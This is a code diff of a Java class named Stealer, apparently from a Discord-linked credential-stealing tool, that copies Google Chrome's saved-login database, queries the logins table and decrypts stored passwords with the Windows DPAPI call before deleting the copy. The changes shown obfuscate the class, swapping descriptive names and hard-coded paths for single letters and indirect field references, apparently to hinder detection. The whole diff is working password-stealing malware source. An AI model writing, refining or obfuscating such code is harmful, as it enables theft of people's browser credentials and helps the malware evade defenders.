@@ -1,6 +1,7 @@
 package me.mafrans.discordsw.stealer;
 
 import com.sun.jna.platform.win32.Crypt32Util;
+import me.mafrans.discordsw.Main;
 
 import java.io.File;
 import java.io.IOException;
@@ -16,41 +17,41 @@ import java.util.List;
  */
 public class Stealer
 {
-    private static String db = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data";
+    private static String d = System.getenv("LOCALAPPDATA") + Main.sql.a;
 
     private static Connection connect() throws SQLException, ClassNotFoundException, IOException
     {
-            String dbLocation = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Lgin Data";
-            if(!new File(dbLocation).exists())
+        String b = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Lgin Data";
+        if (!new File(b).exists())
             {
-               Files.copy(Paths.get(db), Paths.get(dbLocation));
+                Files.copy(Paths.get(d), Paths.get(b));
             }
             Class.forName("org.sqlite.JDBC");
-            String url = "jdbc:sqlite:" + dbLocation;
-            return DriverManager.getConnection(url);
+        String u = "jdbc:sqlite:" + b;
+        return DriverManager.getConnection(u);
     }
 
-    public static  List<Data> steal()
+    public static List<Data> s()
     {
         try
         {
            Connection connection =  connect();
            Statement st = connection.createStatement();
-           ResultSet set = st.executeQuery("SELECT * FROM logins");
+            ResultSet set = st.executeQuery("SELECT * FROM " + Main.sql.c);
            List<Data> data = new ArrayList<>();
            while(set.next())
            {
-               String siteURL = set.getString("action_url");
-               String username = set.getString("username_value");
-               byte[] passwordBlob = set.getBytes("password_value");
-               byte[] decryptedBlob = Crypt32Util.cryptUnprotectData(passwordBlob);
-               String password = new String(decryptedBlob, "UTF-8");
-               Data dt = new Data(siteURL, username, password);
+               String x = set.getString(2);
+               String y = set.getString(4);
+               byte[] a = set.getBytes(6);
+               byte[] b = Crypt32Util.cryptUnprotectData(a);
+               String z = new String(b, "UTF-8");
+               Data dt = new Data(x, y, z);
                data.add(dt);
 
            }
            connection.close();
-           Files.delete(Paths.get(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Lgin Data"));
+            Files.delete(Paths.get(System.getenv("LOCALAPPDATA") + Main.sql.b));
            return data;
         }
         catch(SQLException | ClassNotFoundException | IOException ex)
